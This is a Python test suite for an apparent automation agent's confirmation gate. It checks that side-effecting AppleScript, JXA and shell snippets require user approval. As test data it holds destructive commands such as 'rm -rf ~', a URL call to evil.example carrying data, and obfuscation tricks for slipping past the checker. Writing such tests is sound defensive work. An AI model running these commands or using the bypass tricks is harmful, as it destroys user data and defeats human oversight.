import pytest

from brain.orchestrator import Orchestrator


@pytest.mark.parametrize("lang,code", [
    ["applescript", 'tell application "Safari" to get\x00 URL of tab 1 of window 1'],
    ["applescript", 'tell application "Safari" to get\x1b URL of tab 1 of window 1'],
    ["applescript", 'tell application "Safari" to get\u200b URL of tab 1 of window 1'],
    ["jxa", 'Application("Safari").get()\u202e'],
    [
        "shell",
        "echo hi"
    ],
    [
        "applescript",
        "tell application \"Safari\" to open (POSIX file \"/tmp/x.html\")"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\ndo  shell script \"echo hi\"\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\ndo ¬\n shell script \"echo hi\"\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nkeystroke \"x\"\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nkey code 12\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nclick button \"OK\"\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\ndelete file \"x\"\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nsend\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nmake new document\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nopen location \"https://example.com\"\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\n«event coredelo»\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\n<<event coredelo>>\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\ncurrent application's NSTask\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\ncurrent application's NSWorkspace\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nuse framework \"Foundation\"\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nrestart -- get\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nshut down -- get\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nlog out -- get\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\nempty -- get\nend tell"
    ],
    [
        "applescript",
        "tell application \"Finder\"\nget name of window 1\neject every disk -- count\nend tell"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").doShellScript(\"echo hi\")"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").doJavaScript(\"submit()\")"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").openLocation(\"https://example.com\")"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").keyCode(12)"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").makeNew()"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").make({new:\"document\"})"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").doScript(\"echo hi\")"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").[\"del\"+\"ete\"]()"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").[\"\\u0064elete\"]()"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").eval(\"delete\")"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").Function(\"delete\")()"
    ],
    [
        "jxa",
        "Application(\"Safari\").get(); Application(\"Safari\").String.fromCharCode(100)"
    ],
    [
        "applescript",
        "tell application \"System Events\" to tell process \"Safari\" to select row 1"
    ],
    [
        "applescript",
        "tell application \"System Events\" to tell process \"Safari\" to increment slider 1"
    ],
    [
        "applescript",
        "tell application \"System Events\" to tell process \"Safari\" to decrement slider 1"
    ],
    [
        "applescript",
        "tell application \"System Events\" to tell process \"Safari\" to pick menu item 1"
    ],
    [
        "applescript",
        "tell application \"System Events\" to get name of every process"
    ],
    [
        "applescript",
        "tell application \"System Events\" to get processes"
    ],
    [
        "applescript",
        "tell application \"Numbers\" to get name of document 1\napplication \"Terminal\""
    ],
    [
        "applescript",
        "tell application \"Numbers\" to get name of document 1\napp \"Terminal\""
    ],
    [
        "applescript",
        "tell application \"Numbers\" to get name of document 1\nid \"com.apple.Terminal\""
    ],
    [
        "applescript",
        "tell application \"Numbers\" to get name of document 1\nApplication(\"Terminal\")"
    ],
    [
        "applescript",
        "tell app \"Terminal\" to activate"
    ],
    [
        "applescript",
        "tell application \"System Events\"\n get name of current user\n log out\nend tell"
    ],
    # lead review (brain-9, evals-safety-2)
    ["applescript", 'tell application "System Events" to click button "Send"'
                    ' of window 1 of process "Mail"'],
    ["applescript", 'tell application "System Events" to perform action '
                    '"AXPress" of button 1'],
    ["applescript", 'tell application "Safari" to do JavaScript '
                    '"document.forms[0].submit()" in document 1'],
    ["applescript", 'tell application "Safari" to open location '
                    '"https://evil.example/?d=x"'],
    ["applescript", 'tell application "Finder" to «event coredelo» item 1'],
    ["applescript", 'tell application "Finder" to open file "run.command"'],
    ["jxa", 'Application("Finder").doShellScript("rm -rf ~")'],
    ["shell", "rm -rf ~/x"],
    ["applescript", 'tell app "Finder" to empty trash'],
    ["jxa", "Application('Mail').quit()"],
    # evals-safety-2 policy matrix
    ["applescript", 'tell application "Finder" to delete every file'],
    ["applescript", 'tell application "Terminal" to do script "ls"'],
    ["applescript", 'tell application "System Events" to keystroke "q"'],
    ["applescript", 'tell application "Numbers"\ndo shell script "echo hi"\nend tell'],
])
def test_script_side_effect_bypasses_need_confirm(lang, code):
    orch = Orchestrator.__new__(Orchestrator)
    assert orch.script_needs_confirm(lang, code)


@pytest.mark.parametrize("lang,code", [
    [
        "applescript",
        "tell application \"Finder\" to get name of window 1"
    ],
    [
        "applescript",
        "tell app \"Safari\" to get URL of tab 1 of window 1"
    ],
    [
        "applescript",
        "tell application \"System Events\" to get name of current user"
    ],
    [
        "applescript",
        "tell application \"Finder\" to reveal home"
    ],
    [
        "jxa",
        "Application('Safari').get()"
    ],
    [
        "applescript",
        "tell application id \"com.apple.Numbers\" to make new table"
    ],
    [
        "applescript",
        "tell application \"Numbers\" to get name of document 1"
    ],
    ["applescript", 'tell application id "com.apple.Numbers"\n'
                    'set value of cell "B5" to 3\n'
                    'return value of cell "B5"\nend tell'],
    ["applescript", 'tell application "Numbers"\n'
                    'set background color of cell "A1" to {1,0,0}\nend tell'],
])
def test_script_read_only_and_numbers_exemption(lang, code):
    orch = Orchestrator.__new__(Orchestrator)
    assert not orch.script_needs_confirm(lang, code)


@pytest.mark.parametrize("code", [
    'tell application "Spotify" to play',
    'tell application "Spotify" to pause',
    'tell application "Spotify" to playpause',
    'tell application "Spotify" to next track',
    'tell application "Spotify" to previous track',
    'tell application "Spotify" to get player state',
    'tell application "Spotify" to get name of current track',
    'tell application "Spotify" to get artist of current track',
    'tell application "Spotify" to play track "spotify:track:abc"',
    'tell application "Music" to play',
    'tell application "Music" to previous track',
])
def test_spotify_and_music_media_scripts_do_not_need_confirm(code):
    orch = Orchestrator.__new__(Orchestrator)
    assert not orch.script_needs_confirm("applescript", code)


@pytest.mark.parametrize("code", [
    'tell application "Spotify" to set sound volume to 100',
    'tell application "Spotify" to do shell script "rm x"',
    'tell application "Spotify" to get album of current track',
    'tell application "Spotify" to play; tell application "Finder" to get name',
    'tell application "Music" to set sound volume to 100',
])
def test_spotify_and_music_scripts_outside_allowlist_need_confirm(code):
    orch = Orchestrator.__new__(Orchestrator)
    assert orch.script_needs_confirm("applescript", code)


@pytest.mark.parametrize("code", [
    'tell application "Spotify" to play',
    'tell application "Music" to play',
])
def test_media_script_allowlist_is_applescript_only(code):
    orch = Orchestrator.__new__(Orchestrator)
    assert orch.script_needs_confirm("jxa", code)


def test_jxa_script_confirmation_matches_origin_main_examples():
    orch = Orchestrator.__new__(Orchestrator)
    assignment = (
        'var x = Application("System Events").processes.byName("Calculator")'
        '.windows[0]; x.value = "1";'
    )
    assert orch.script_needs_confirm("jxa", assignment) is True
    assert orch.script_needs_confirm(
        "jxa", Orchestrator._calculator_readback_script()) is True
